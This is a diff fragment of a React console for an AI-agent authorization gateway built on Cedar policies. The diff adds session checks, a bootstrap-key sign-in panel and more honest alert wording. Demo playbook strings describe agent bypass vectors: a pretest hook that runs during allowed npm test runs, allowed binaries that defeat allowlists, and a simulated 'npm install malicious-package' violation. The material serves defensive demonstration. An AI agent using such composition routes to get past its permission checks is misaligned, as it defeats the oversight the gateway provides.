               setConsoleLines(prev => [
                 ...prev,
                 '👉 Vector 2: Cross-Tier Composition Path check...',
                 '🔍 [CEDAR EVALUATION] Checking principal authorization for write_file("apps/secure-gateway/package.json")...'
               ]);
               try {
+                if (epoch !== sessionEpoch.current) return;
                 const res3 = await fetch(`${API_BASE}/authorize`, {
                   method: 'POST',
                   headers: getHeaders(),
@@ -1457,22 +1350,22 @@ export default function App() {
                   ...prev,
                   data3.decision === 'allow'
                     ? '✅ [DECISION] Permitted: ALLOW (Tier 2 rule permits package.json workspace edits)'
-                    : `❌ [DECISION] Blocked: ${data3.decision.toUpperCase()}`,
+                    : `❌ [DECISION] Blocked: ${String(data3.decision || data3.error || 'No decision').toUpperCase()}`,
                   '📦 [COMPOSITION ATTACK] Pretest hook executes implicitly during allowed npm test runs.',
                   '⚠️  [CONCLUSION] Obvious commands are audited, but allowlist gates cannot block composition hooks or allowed-binary capabilities on the host!'
                 ]);
               } catch (err: any) {
                 setConsoleLines(prev => [...prev, `❌ [CONNECTION ERROR] ${err.message}`]);
               }
-            }, 600);
-          }, 600);
-        }, 600);
+            }
+          }
+        }
       } else if (cmd === 'test-receipt') {
         if (authRole !== 'admin') {
           setConsoleLines(prev => [
             ...prev,
             `❌ SECURITY ERROR: Administrative credentials required to spawn isolated shell runtimes!`,
-            `👉 Recommendation: Please authenticate as 'Administrator' using the top OIDC controller widget.`
+            `👉 Recommendation: Please authenticate as 'Administrator' using the gateway session panel.`
           ]);
           setActivePlaybook(null);
           return;
@@ -1488,7 +1381,7 @@ export default function App() {
           setConsoleLines(prev => [
             ...prev,
             `❌ SECURITY ERROR: Administrative credentials required to spawn isolated shell runtimes!`,
-            `👉 Recommendation: Please authenticate as 'Administrator' using the top OIDC controller widget.`
+            `👉 Recommendation: Please authenticate as 'Administrator' using the gateway session panel.`
           ]);
           setActivePlaybook(null);
           return;
@@ -1504,7 +1397,7 @@ export default function App() {
           setConsoleLines(prev => [
             ...prev,
             `❌ SECURITY ERROR: Authenticated session required to run Cedar policy queries!`,
-            `👉 Recommendation: Please log in using the OIDC widget at the top.`
+            `👉 Recommendation: Please log in using the gateway session panel at the top.`
           ]);
           setActivePlaybook(null);
           return;
@@ -1517,6 +1410,7 @@ export default function App() {
 
         // Run query 1: write_file to policy.cedar
         try {
+          if (epoch !== sessionEpoch.current) return;
           const res1 = await fetch(`${API_BASE}/authorize`, {
             method: 'POST',
             headers: getHeaders(),
@@ -1541,6 +1435,7 @@ export default function App() {
 
         // Run query 2: execute_command raw command
         try {
+          if (epoch !== sessionEpoch.current) return;
           const res2 = await fetch(`${API_BASE}/authorize`, {
             method: 'POST',
             headers: getHeaders(),
@@ -1565,6 +1460,7 @@ export default function App() {
 
         // Run query 3: execute_command curl command
         try {
+          if (epoch !== sessionEpoch.current) return;
           const res3 = await fetch(`${API_BASE}/authorize`, {
             method: 'POST',
             headers: getHeaders(),
@@ -1592,7 +1488,7 @@ export default function App() {
           setConsoleLines(prev => [
             ...prev,
             `❌ SECURITY ERROR: Administrative credentials required to dispatch incident webhooks!`,
-            `👉 Recommendation: Please authenticate as 'Administrator' using the top OIDC controller widget.`
+            `👉 Recommendation: Please authenticate as 'Administrator' using the gateway session panel.`
           ]);
           setActivePlaybook(null);
           return;
@@ -1601,11 +1497,12 @@ export default function App() {
           ...prev,
           '🚀 [PLAYBOOK] Triggering live Incident Alerting & Slack Notification Gateway...',
           '⚠️  [ALERT] Simulating dynamic AI Agent violation: "npm install malicious-package"...',
-          '📡 [DISPATCH] Dispatching real-time alerts to Slack Security operations channel...'
+          '[ALERT TEST] Submitting an authorization probe. Configured gateway integrations may dispatch alerts.'
         ]);
         
         // Send a tampered receipt payload to show server catching the violation and dispatching webhook!
         try {
+          if (epoch !== sessionEpoch.current) return;
           const res = await fetch(`${API_BASE}/receipts`, {
             method: 'POST',
             headers: getHeaders(),
@@ -1642,7 +1539,7 @@ export default function App() {
             setConsoleLines(prev => [
               ...prev,
               '=============================================================',
-              '🟢 SLACK WEBHOOK DISPATCHED PAYLOAD (RICH BLOCKS):',
+              '🟢 EXAMPLE ALERT PAYLOAD (DELIVERY NOT VERIFIED):',
               '=============================================================',
               JSON.stringify({
                 text: "🚨 FidusGate Security Alert: Blocked AI Agent Action!",
@@ -1676,7 +1573,7 @@ export default function App() {
                 ]
               }, null, 2),
               '=============================================================',
-              '✅ [PLAYBOOK] Webhook successfully verified. Alerting gateway operational!'
+              '[PLAYBOOK] Denied request recorded. External alert delivery has not been verified.'
             ]);
           }
         } catch (e: any) {
@@ -1697,7 +1594,7 @@ export default function App() {
           setConsoleLines(prev => [
             ...prev,
             `❌ SECURITY ERROR: Administrative or Developer credentials required to spawn isolated shell runtimes!`,
-            `👉 Recommendation: Please authenticate using the top OIDC controller widget.`
+            `👉 Recommendation: Please authenticate using the gateway session panel.`
           ]);
           setActivePlaybook(null);
           return;
@@ -1722,7 +1619,7 @@ export default function App() {
   // Live Console Submit Handler
   const handleConsoleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!consoleInput.trim()) return;
+    if (!consoleInput.trim() || activePlaybook) return;
 
     const fullCmd = consoleInput.trim();
     setConsoleLines(prev => [...prev, `fidusgate-sandbox $ ${fullCmd}`]);
@@ -1738,96 +1635,26 @@ export default function App() {
   };
 
   return (
-    <div className="app-container animate-fade-in" role="main">
-      {/* Header */}
-      <header className="app-header" id="brand-header">
-        <div className="brand-section">
-          <h1>
-            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ color: 'hsl(var(--primary))', filter: 'drop-shadow(0 0 8px hsla(var(--primary), 0.45))' }}>
-              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-            </svg>
-            FidusGate Security Portal
-          </h1>
-          <p>Secure, Governed, and Self-Refactoring AI-Agentic SDLC Console</p>
-        </div>
-        <div className="system-status">
-          <div className="status-indicator"></div>
-          <span className="status-label">SECURITY ONLINE</span>
-
-          <button className="btn btn-secondary" onClick={() => { setTourStep(0); setTourActive(true); }} style={{ marginLeft: '0.8rem', padding: '0.35rem 0.85rem', fontSize: '0.78rem', borderColor: 'rgba(0, 255, 102, 0.4)', color: '#00ff66' }}>
-            🎓 Tour
-          </button>
-
-          <button className="btn btn-secondary" onClick={handleResetDatabase} style={{ marginLeft: '0.8rem', padding: '0.35rem 0.85rem', fontSize: '0.78rem' }}>
-            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-              <path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67"/>
-            </svg>
-            Reset DB
-          </button>
-        </div>
-      </header>
-
-      {/* OIDC Session Controller Drawer */}
-      <section className="glass-panel oidc-panel" id="oidc-widget">
-        <div className="oidc-header">
-          <div className="oidc-icon">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4" />
-            </svg>
-          </div>
-          <div className="oidc-title">
-            <h3>OIDC Federated Identity Provider (JWT Simulator)</h3>
-            <p>Select a corporate identity role to obtain a signed JWT token and mount bearer auth gates.</p>
-          </div>
-        </div>
-        
-        <div className="oidc-controls">
-          {authRole === 'unauthenticated' ? (
-            <>
-              <input 
-                type="email" 
-                className="form-control oidc-input" 
-                value={authEmail}
-                onChange={e => setAuthEmail(e.target.value)}
-                placeholder="admin@fidusgate.internal"
-              />
-              <button className="btn btn-secondary" onClick={() => handleOidcLogin('developer')} disabled={authLoading}>
-                Login as Developer
-              </button>
-              <button className="btn btn-primary" onClick={() => handleOidcLogin('admin')} disabled={authLoading}>
-                Login as Administrator
-              </button>
-              <button className="btn btn-secondary animate-glow-orange-border" style={{ background: 'rgba(255, 107, 107, 0.08)', color: 'hsl(var(--danger))', borderColor: 'rgba(255, 107, 107, 0.3)' }} onClick={() => handleOidcLogin('auditor')} disabled={authLoading}>
-                Login as Auditor
-              </button>
-            </>
-          ) : (
-            <>
-              <span className="oidc-session-info">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ color: authRole === 'admin' ? 'hsl(var(--warning))' : 'hsl(var(--success))' }}>
-                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-                  <circle cx="12" cy="11" r="2" />
-                  <path d="M12 13v3" />
-                </svg>
-                Active Session: <strong style={{ color: authRole === 'admin' ? 'hsl(var(--warning))' : 'hsl(var(--success))', marginLeft: '0.2rem' }}>{authRole.toUpperCase()}</strong> <span style={{ color: 'hsl(var(--text-muted))', margin: '0 0.2rem' }}>|</span> User: <strong style={{ color: '#fff' }}>{authEmail}</strong>
-              </span>
-              <button className="btn btn-secondary" onClick={handleOidcLogout}>
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                  <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9"/>
-                </svg>
-                Disconnect Session
-              </button>
-            </>
-          )}
-        </div>
-      </section>
-
-      <TabNav activeTab={activeTab} onChange={setActiveTab} />
-
+    <ConnectedShell view={activeTab} onNavigate={setActiveTab} connection={connection}
+      authRole={authRole} authEmail={authEmail} gatewayNotice={gatewayNotice}
+      onRefresh={() => void fetchData()} onTour={() => { setTourStep(0); setTourActive(true); }}
+      onReset={handleResetDatabase}
+      session={<div id="oidc-widget">
+        <div className="oidc-title"><h3>Development gateway session</h3>
+          <p>Use the gateway’s bootstrap key to request a role-scoped session. Credentials stay in memory. Production sign-in is not implemented.</p></div>
+        {authRole === 'unauthenticated' ? <div className="oidc-controls">
+          <label>Email<input type="email" className="form-control" value={authEmail} onChange={e => setAuthEmail(e.target.value)} autoComplete="username" /></label>
+          <label>Bootstrap key<input type="password" className="form-control" value={bootstrapKey} onChange={e => setBootstrapKey(e.target.value)} autoComplete="off" /></label>
+          {(['developer', 'admin', 'auditor'] as const).map(role => <button key={role} className="btn btn-secondary" onClick={() => void handleOidcLogin(role)} disabled={authLoading || !bootstrapKey.trim()}>Sign in as {role}</button>)}
+        </div> : <div className="oidc-controls"><p>Signed in as <strong>{authEmail}</strong> · {authRole}. Authenticated data refreshes every four seconds.</p><button className="btn btn-secondary" onClick={handleOidcLogout}>Disconnect session</button></div>}
+        {authError && <p role="alert">{authError}</p>}
+      </div>}>
       {/* Tab Panels */}
       <div className="tab-content-panel">
+        {activeTab === 'decisions' && <ConnectedDecisions receipts={receipts} status={receiptStatus} isChainValid={isChainValid} onRetry={() => void fetchData()} onVerify={receipt => { updateReceiptInput(JSON.stringify(receipt, null, 2)); setActiveTab('verify'); }} />}
+        {activeTab === 'verify' && <ConnectedVerifier input={receiptInput} onInputChange={updateReceiptInput} onVerify={handleVerifyReceipt} result={verificationResult} busy={verificationBusy} />}
         {activeTab === 'ledger' && (
-          <LedgerTab
+          <fieldset disabled={authRole !== 'admin' && authRole !== 'developer'} style={{ border: 0, padding: 0, margin: 0, minWidth: 0 }}><legend className="cc-description">Transactions · creating requests requires an admin or developer session.</legend><LedgerTab
             transactions={transactions}
             txNotification={txNotification}
             txError={txFormState.error}
@@ -1841,7 +1668,7 @@ export default function App() {
             setTxCurrency={setTxCurrency}
             txLoading={txLoading}
             formAction={txFormAction}
-          />
+          /></fieldset>
         )}
         {activeTab === 'compliance' && (
           <ComplianceTab
@@ -1934,7 +1761,7 @@ export default function App() {
             setForensicStatusFilter={setForensicStatusFilter}
             authRole={authRole}
             receiptInput={receiptInput}
-            setReceiptInput={setReceiptInput}
+            setReceiptInput={updateReceiptInput}
             verificationResult={verificationResult}
             handleVerifyReceipt={handleVerifyReceipt}
             handleDownloadComplianceReceipt={handleDownloadComplianceReceipt}
@@ -1993,6 +1820,6 @@ export default function App() {
           </div>
         </>
       )}
-    </div>
+    </ConnectedShell>
   );
 }
